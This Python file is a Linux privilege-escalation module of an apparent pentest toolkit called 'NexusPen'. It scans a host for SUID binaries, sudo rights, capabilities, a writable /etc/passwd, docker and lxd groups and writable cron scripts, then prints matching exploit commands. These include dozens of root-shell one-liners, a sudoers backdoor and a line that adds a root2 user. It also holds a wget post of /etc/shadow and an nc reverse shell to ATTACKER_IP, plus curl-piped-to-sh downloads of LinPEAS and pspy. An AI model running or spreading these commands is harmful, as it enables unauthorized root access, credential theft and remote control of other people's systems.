#!/usr/bin/env python3
"""
NexusPen - Linux Privilege Escalation Module
=============================================
Linux privilege escalation techniques and exploits.
"""

import subprocess
import os
from typing import Dict, List, Optional
from dataclasses import dataclass

from rich.console import Console
from rich.table import Table
from rich.panel import Panel

console = Console()


@dataclass
class PrivEscVector:
    """Privilege escalation vector."""
    name: str
    type: str  # suid, sudo, capability, kernel, misc
    binary: str
    exploit_cmd: str
    description: str
    risk: str = "high"


class LinuxPrivEsc:
    """
    Linux privilege escalation techniques.
    """
    
    # GTFOBins SUID exploits
    GTFOBINS_SUID = {
        'bash': 'bash -p',
        'sh': 'sh -p',
        'dash': 'dash -p',
        'zsh': 'zsh',
        'python': 'python -c "import os; os.execl(\'/bin/sh\', \'sh\', \'-p\')"',
        'python2': 'python2 -c "import os; os.execl(\'/bin/sh\', \'sh\', \'-p\')"',
        'python3': 'python3 -c "import os; os.execl(\'/bin/sh\', \'sh\', \'-p\')"',
        'perl': 'perl -e "exec \'/bin/sh\';"',
        'ruby': 'ruby -e "exec \'/bin/sh\'"',
        'php': 'php -r "pcntl_exec(\'/bin/sh\', [\'-p\']);"',
        'node': 'node -e "require(\'child_process\').spawn(\'/bin/sh\', [\'-p\'], {stdio: [0, 1, 2]})"',
        'vim': 'vim -c \':!/bin/sh -p\'',
        'vi': 'vi -c \':!/bin/sh -p\'',
        'nano': 'nano; ^R^X; reset; sh -p 1>&0 2>&0',
        'less': 'less /etc/passwd; !/bin/sh -p',
        'more': 'more /etc/passwd; !/bin/sh -p',
        'find': 'find . -exec /bin/sh -p \\; -quit',
        'nmap': 'nmap --interactive; !sh',
        'awk': 'awk "BEGIN {system(\'/bin/sh -p\')}"',
        'gawk': 'gawk "BEGIN {system(\'/bin/sh -p\')}"',
        'tar': 'tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
        'zip': 'zip /tmp/x.zip /tmp/x -T --unzip-command="sh -c /bin/sh"',
        'env': 'env /bin/sh -p',
        'cp': 'LFILE=/etc/passwd; cp -p /bin/sh /tmp/pwned; chmod +s /tmp/pwned; /tmp/pwned -p',
        'mv': '',  # Complex, requires specific scenario
        'dd': '',  # Can overwrite files
        'docker': 'docker run -v /:/mnt --rm -it alpine chroot /mnt sh',
        'lxc': 'lxc-start -n mycontainer -f /etc/lxc/default.conf',
        'systemctl': 'TF=$(mktemp).service; echo "[Service]\\nType=oneshot\\nExecStart=/bin/sh -c \\"chmod +s /bin/bash\\"\\n[Install]\\nWantedBy=multi-user.target" > $TF; systemctl link $TF; systemctl enable --now $(basename $TF)',
        'strace': 'strace -o /dev/null /bin/sh -p',
        'ltrace': 'ltrace -b -L /bin/sh -p',
        'taskset': 'taskset 1 /bin/sh -p',
        'setarch': 'setarch $(arch) /bin/sh -p',
        'ionice': 'ionice /bin/sh -p',
        'nice': 'nice /bin/sh -p',
        'timeout': 'timeout 7d /bin/sh -p',
        'time': 'time /bin/sh -p',
        'script': 'script -q /dev/null /bin/sh -p',
        'tclsh': 'tclsh; exec /bin/sh -p <@stdin >@stdout 2>@stderr',
        'expect': 'expect -c "spawn /bin/sh -p;interact"',
        'start-stop-daemon': 'start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p',
        'run-parts': 'run-parts --new-session --regex "^sh$" /bin --arg=-p',
        'xargs': 'xargs -a /dev/null sh -p',
        'pkexec': 'pkexec /bin/sh',
        'doas': 'doas /bin/sh',
        'busybox': 'busybox sh -p',
        'aria2c': 'aria2c --allow-overwrite --gid=aaaa --on-download-complete=/bin/sh http://x',
        'rvim': 'rvim -c \':py import os; os.execl("/bin/sh", "sh", "-p", "-c", "reset; exec sh -p")\'',
    }
    
    # Sudo GTFOBins exploits
    GTFOBINS_SUDO = {
        'vim': 'sudo vim -c \':!/bin/bash\'',
        'vi': 'sudo vi -c \':!/bin/bash\'',
        'nano': 'sudo nano; ^R^X; reset; bash 1>&0 2>&0',
        'less': 'sudo less /etc/passwd; !/bin/bash',
        'more': 'sudo more /etc/passwd; !/bin/bash',
        'awk': 'sudo awk \'BEGIN {system("/bin/bash")}\'',
        'gawk': 'sudo gawk \'BEGIN {system("/bin/bash")}\'',
        'find': 'sudo find . -exec /bin/bash \\; -quit',
        'nmap': 'sudo nmap --interactive; !bash',
        'python': 'sudo python -c "import pty;pty.spawn(\'/bin/bash\')"',
        'python3': 'sudo python3 -c "import pty;pty.spawn(\'/bin/bash\')"',
        'perl': 'sudo perl -e "exec \'/bin/bash\';"',
        'ruby': 'sudo ruby -e "exec \'/bin/bash\'"',
        'php': 'sudo php -r "system(\'/bin/bash\');"',
        'env': 'sudo env /bin/bash',
        'tar': 'sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash',
        'zip': 'sudo zip /tmp/x.zip /tmp/x -T --unzip-command="sh -c /bin/bash"',
        'git': 'sudo git -p help config; !/bin/bash',
        'ftp': 'sudo ftp; !/bin/bash',
        'socat': 'sudo socat stdin exec:/bin/bash',
        'tee': 'echo "user ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/pwned',
        'man': 'sudo man man; !/bin/bash',
        'ssh': 'sudo ssh -o ProxyCommand=";/bin/bash 0<&2 1>&2" x',
        'mysql': 'sudo mysql -e "\\! /bin/bash"',
        'psql': 'sudo psql; \\!; bash',
        'journalctl': 'sudo journalctl; !/bin/bash',
        'systemctl': 'sudo systemctl; !bash',
        'apache2': 'sudo apache2 -f /etc/shadow',
        'wget': 'sudo wget --post-file=/etc/shadow http://ATTACKER_IP',
        'curl': 'sudo curl file:///etc/shadow',
        'nc': 'sudo nc -e /bin/bash ATTACKER_IP 4444',
        'ed': 'sudo ed; !/bin/bash',
        'screen': 'sudo screen; /bin/bash',
        'tmux': 'sudo tmux; /bin/bash',
        'docker': 'sudo docker run -v /:/mnt --rm -it alpine chroot /mnt bash',
        'mount': 'sudo mount -o bind /bin/bash /bin/mount; sudo mount',
        'service': 'sudo service ../../bin/bash',
        'strace': 'sudo strace -o /dev/null /bin/bash',
        'knife': 'sudo knife exec -E \'exec "/bin/bash"\'',
        'flock': 'sudo flock -u / /bin/bash',
        'cpulimit': 'sudo cpulimit -l 100 -f /bin/bash',
        'lua': 'sudo lua -e "os.execute(\'/bin/bash\')"',
        'expect': 'sudo expect -c "spawn /bin/bash;interact"',
        'hping3': 'sudo hping3; /bin/bash',
        'jrunscript': 'sudo jrunscript -e "exec(\'/bin/bash -c bash\')"',
        'rlwrap': 'sudo rlwrap /bin/bash',
        'scp': '',  # Need specific scenario
        'rsync': 'sudo rsync -e \'sh -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null',
    }
    
    # Capabilities exploits
    CAPABILITIES = {
        'cap_setuid': 'Allows changing UID - privesc possible',
        'cap_setgid': 'Allows changing GID - privesc possible',
        'cap_dac_override': 'Bypass file permission checks',
        'cap_dac_read_search': 'Bypass file read permissions',
        'cap_sys_admin': 'Full system admin - very dangerous',
        'cap_sys_ptrace': 'Allows process tracing',
        'cap_net_admin': 'Network configuration',
        'cap_net_raw': 'Raw network access',
        'cap_chown': 'Change file ownership',
    }
    
    CAPABILITY_EXPLOITS = {
        'python': {
            'cap_setuid': 'python3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"',
            'cap_setgid': 'python3 -c "import os; os.setgid(0); os.system(\'/bin/bash\')"',
        },
        'perl': {
            'cap_setuid': 'perl -e \'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";\'',
        },
        'ruby': {
            'cap_setuid': 'ruby -e \'Process::Sys.setuid(0); exec "/bin/bash"\'',
        },
        'php': {
            'cap_setuid': 'php -r "posix_setuid(0); system(\'/bin/bash\');"',
        },
        'node': {
            'cap_setuid': 'node -e \'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})\'',
        },
        'tar': {
            'cap_dac_read_search': 'tar -cvf shadow.tar /etc/shadow; tar -xvf shadow.tar',
        },
        'vim': {
            'cap_dac_override': 'vim /etc/shadow',
        },
    }
    
    def __init__(self):
        self.vectors: List[PrivEscVector] = []
    
    def check_suid_binaries(self) -> List[PrivEscVector]:
        """Find and analyze SUID binaries."""
        console.print("\n[cyan]🔴 Checking SUID binaries...[/cyan]")
        
        vectors = []
        
        result = subprocess.run(
            ['find', '/', '-perm', '-4000', '-type', 'f'],
            capture_output=True, text=True, timeout=60
        )
        
        for binary_path in result.stdout.strip().split('\n'):
            if not binary_path:
                continue
            
            binary_name = os.path.basename(binary_path)
            
            if binary_name in self.GTFOBINS_SUID:
                exploit_cmd = self.GTFOBINS_SUID[binary_name]
                if exploit_cmd:
                    vector = PrivEscVector(
                        name=f"SUID {binary_name}",
                        type="suid",
                        binary=binary_path,
                        exploit_cmd=exploit_cmd.replace(binary_name, binary_path),
                        description=f"SUID binary {binary_name} can be exploited for root shell"
                    )
                    vectors.append(vector)
                    self.vectors.append(vector)
                    console.print(f"[red]  ⚠️ {binary_path}[/red]")
        
        console.print(f"[green]✓ Found {len(vectors)} exploitable SUID binaries[/green]")
        return vectors
    
    def check_sudo_permissions(self) -> List[PrivEscVector]:
        """Check sudo permissions for privesc."""
        console.print("\n[cyan]🔑 Checking sudo permissions...[/cyan]")
        
        vectors = []
        
        result = subprocess.run(
            ['sudo', '-l'],
            capture_output=True, text=True, timeout=10
        )
        
        sudo_output = result.stdout + result.stderr
        
        # Parse sudo -l output
        for line in sudo_output.split('\n'):
            line = line.strip()
            
            if 'NOPASSWD' in line or '(ALL)' in line or '(root)' in line:
                # Extract binary/command
                for binary_name, exploit_cmd in self.GTFOBINS_SUDO.items():
                    if binary_name in line.lower() and exploit_cmd:
                        vector = PrivEscVector(
                            name=f"Sudo {binary_name}",
                            type="sudo",
                            binary=binary_name,
                            exploit_cmd=exploit_cmd,
                            description=f"Can run {binary_name} as root via sudo"
                        )
                        vectors.append(vector)
                        self.vectors.append(vector)
                        console.print(f"[red]  ⚠️ {binary_name} - NOPASSWD[/red]")
        
        # Check for sudo ALL
        if '(ALL : ALL) ALL' in sudo_output or '(ALL) ALL' in sudo_output:
            console.print("[red]  ⚠️ User has FULL sudo access![/red]")
        
        return vectors
    
    def check_capabilities(self) -> List[PrivEscVector]:
        """Check file capabilities for privesc."""
        console.print("\n[cyan]🟣 Checking capabilities...[/cyan]")
        
        vectors = []
        
        result = subprocess.run(
            ['getcap', '-r', '/'],
            capture_output=True, text=True, timeout=60
        )
        
        for line in result.stdout.strip().split('\n'):
            if not line or '=' not in line:
                continue
            
            parts = line.rsplit(' ', 1)
            if len(parts) < 2:
                continue
            
            binary_path = parts[0].strip()
            caps = parts[1].strip()
            binary_name = os.path.basename(binary_path)
            
            # Check for dangerous capabilities
            for cap, desc in self.CAPABILITIES.items():
                if cap in caps:
                    exploit_cmd = ""
                    
                    # Get specific exploit
                    if binary_name in self.CAPABILITY_EXPLOITS:
                        if cap in self.CAPABILITY_EXPLOITS[binary_name]:
                            exploit_cmd = self.CAPABILITY_EXPLOITS[binary_name][cap]
                    
                    if exploit_cmd or cap in ['cap_setuid', 'cap_setgid', 'cap_sys_admin']:
                        vector = PrivEscVector(
                            name=f"Capability {cap}",
                            type="capability",
                            binary=binary_path,
                            exploit_cmd=exploit_cmd or f"# {binary_name} has {cap}",
                            description=desc
                        )
                        vectors.append(vector)
                        self.vectors.append(vector)
                        console.print(f"[red]  ⚠️ {binary_path} - {caps}[/red]")
        
        return vectors
    
    def check_writable_passwd(self) -> Optional[PrivEscVector]:
        """Check if /etc/passwd is writable."""
        console.print("\n[cyan]📝 Checking /etc/passwd...[/cyan]")
        
        if os.access('/etc/passwd', os.W_OK):
            vector = PrivEscVector(
                name="Writable /etc/passwd",
                type="misc",
                binary="/etc/passwd",
                exploit_cmd='echo "root2:$(openssl passwd -1 password123):0:0:root:/root:/bin/bash" >> /etc/passwd; su root2',
                description="/etc/passwd is writable - can add root user"
            )
            self.vectors.append(vector)
            console.print("[red]  ⚠️ /etc/passwd is WRITABLE![/red]")
            return vector
        
        return None
    
    def check_docker_privesc(self) -> Optional[PrivEscVector]:
        """Check Docker group privesc."""
        console.print("\n[cyan]🐳 Checking Docker group...[/cyan]")
        
        result = subprocess.run(['id'], capture_output=True, text=True)
        
        if 'docker' in result.stdout:
            vector = PrivEscVector(
                name="Docker Group",
                type="misc",
                binary="docker",
                exploit_cmd='docker run -v /:/mnt --rm -it alpine chroot /mnt bash',
                description="User is in docker group - can mount host filesystem"
            )
            self.vectors.append(vector)
            console.print("[red]  ⚠️ User is in docker group![/red]")
            return vector
        
        return None
    
    def check_lxd_privesc(self) -> Optional[PrivEscVector]:
        """Check LXD group privesc."""
        console.print("\n[cyan]📦 Checking LXD group...[/cyan]")
        
        result = subprocess.run(['id'], capture_output=True, text=True)
        
        if 'lxd' in result.stdout:
            exploit_cmd = """
# On attacker machine:
# git clone https://github.com/saghul/lxd-alpine-builder
# ./build-alpine
# Transfer alpine-*.tar.gz to target

# On target:
lxc image import ./alpine-*.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
"""
            vector = PrivEscVector(
                name="LXD Group",
                type="misc",
                binary="lxc",
                exploit_cmd=exploit_cmd,
                description="User is in lxd group - can create privileged container"
            )
            self.vectors.append(vector)
            console.print("[red]  ⚠️ User is in lxd group![/red]")
            return vector
        
        return None
    
    def check_cron_jobs(self) -> List[PrivEscVector]:
        """Check cron jobs for writable scripts."""
        console.print("\n[cyan]⏰ Checking cron jobs...[/cyan]")
        
        vectors = []
        
        # Check crontab
        crontab = subprocess.run(['cat', '/etc/crontab'], capture_output=True, text=True)
        
        for line in crontab.stdout.split('\n'):
            if line.strip() and not line.startswith('#'):
                # Extract script path
                parts = line.split()
                for part in parts:
                    if part.startswith('/'):
                        # Check if writable
                        if os.access(part, os.W_OK):
                            vector = PrivEscVector(
                                name="Writable Cron Script",
                                type="cron",
                                binary=part,
                                exploit_cmd=f'echo "chmod +s /bin/bash" >> {part}',
                                description=f"Cron script {part} is writable"
                            )
                            vectors.append(vector)
                            self.vectors.append(vector)
                            console.print(f"[red]  ⚠️ Writable: {part}[/red]")
        
        return vectors
    
    def generate_linpeas_command(self) -> str:
        """Generate LinPEAS command."""
        return "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
    
    def generate_pspy_command(self) -> str:
        """Generate pspy command for process monitoring."""
        return "curl -L https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -o pspy && chmod +x pspy && ./pspy"
    
    def run_full_check(self) -> List[PrivEscVector]:
        """Run all privilege escalation checks."""
        console.print("\n[bold red]═══════════════════════════════════════════════════════════[/bold red]")
        console.print("[bold red]              LINUX PRIVILEGE ESCALATION                     [/bold red]")
        console.print("[bold red]═══════════════════════════════════════════════════════════[/bold red]")
        
        self.check_suid_binaries()
        self.check_sudo_permissions()
        self.check_capabilities()
        self.check_writable_passwd()
        self.check_docker_privesc()
        self.check_lxd_privesc()
        self.check_cron_jobs()
        
        # Display results
        self.display_vectors()
        
        return self.vectors
    
    def display_vectors(self):
        """Display all privilege escalation vectors."""
        if not self.vectors:
            console.print("\n[green]No privilege escalation vectors found[/green]")
            return
        
        table = Table(title="Privilege Escalation Vectors", show_header=True,
                     header_style="bold red")
        table.add_column("Type", style="yellow", width=12)
        table.add_column("Name", style="cyan", width=25)
        table.add_column("Binary", style="white", width=30)
        
        for vector in self.vectors:
            table.add_row(vector.type, vector.name, vector.binary)
        
        console.print(table)
        
        # Show exploits
        console.print("\n[bold yellow]═══ EXPLOIT COMMANDS ═══[/bold yellow]")
        for vector in self.vectors[:5]:  # Top 5
            console.print(f"\n[cyan]{vector.name}:[/cyan]")
            console.print(f"[dim]{vector.exploit_cmd}[/dim]")
